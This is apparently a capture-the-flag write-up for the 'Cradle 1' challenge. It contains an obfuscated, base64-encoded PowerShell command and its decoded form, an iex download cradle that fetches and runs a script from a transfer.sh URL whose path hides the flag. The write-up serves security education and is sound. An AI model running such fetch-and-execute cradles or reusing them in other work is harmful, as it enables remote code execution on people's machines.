# Cradle 1

## Description

McSkiddy considers himself a connoisseur of all things PowerShell for initial access. He even found a nifty tool that automagically obfuscates scripts! Surely with this, the secrets of his tradecraft will be known to him alone...right?

Can you prove him wrong by uncovering what this script of his does?

```ps1
powershell -nop -enc "LgAoACIAewAwAH0AewAxAH0AIgAtAGYAJwBpACcALAAnAGUAeAAnACkAIAAoACgALgAoACIAewAwAH0AewAxAH0AewAyAH0AIgAgAC0AZgAnAE4AZQB3AC0AJwAsACcATwBiAGoAZQAnACwAJwBjAHQAJwApACAAUwB5AHMAdABgAGUAbQBbAC4AXQBuAGAARQBgAFQAWwAuAF0AdwBFAEIAYwBsAGkAYABlAG4AdAApAC4AIgBEAG8AVwBOAEwAYABvAEEARABzAGAAVABgAFIAaQBgAE4AZwAiACgAJwBoAHgAeABwAHMAWwA6AC8ALwBdAHQAcgBhAG4AcwBmAGUAcgBbAC4AXQBzAGgALwAoACgAKAAiAHsANAB9AHsAMQB9AHsAMAB9AHsANwB9AHsANgB9AHsAMgB9AHsAMwB9AHsANQB9ACIALQBmACAAJwAnAHMAZQBjACcAJwAsACcAJwB7AG4AbwB0AF8AcwBvAF8AJwAnACwAJwAnAGUAJwAnACwAJwAnAGMAcgBhAGYAdAAnACcALAAnACcAbABlAHYAZQBsAGUAZgBmAGUAYwB0ACcAJwAsACcAJwB9ACcAJwAsACcAJwB0AHIAYQBkACcAJwAsACcAJwByAGUAdABfACcAJwApACkAKQAvAGEAWwAuAF0AcABzADEAJwApACkA"

```

# Method: 

I tried asking chatgpt for help and it provided a script for me to use. however on using it i only got this in return. It looks like a flag in there but not really.

Script to decode it in powershell:

```
import base64

# Base64 encoded string

encoded_str = ""

# Decode the Base64 string

decoded_bytes = base64.b64decode(encoded_str)
decoded_str = decoded_bytes.decode('utf-16')
print(decoded_str)
```
The output:

.("{0}{1}"-f'i','ex') ((.("{0}{1}{2}" -f'New-','Obje','ct') Syst`em[.]n`E`T[.]wEBcli`ent)."DoWNL`oADs`T`Ri`Ng"('hxxps[://]transfer[.]sh/((("{4}{1}{0}{7}{6}{2}{3}{5}"-f ''sec'',''{not_so_'',''e'',''craft'',''leveleffect'',''}'',''trad'',''ret_'')))/a[.]ps1'))

From the message i inferred it to stand for

leveleffect{not_so_secret_tradecraft}

This was correct.

The script appears to download something from a site but cant be sure.
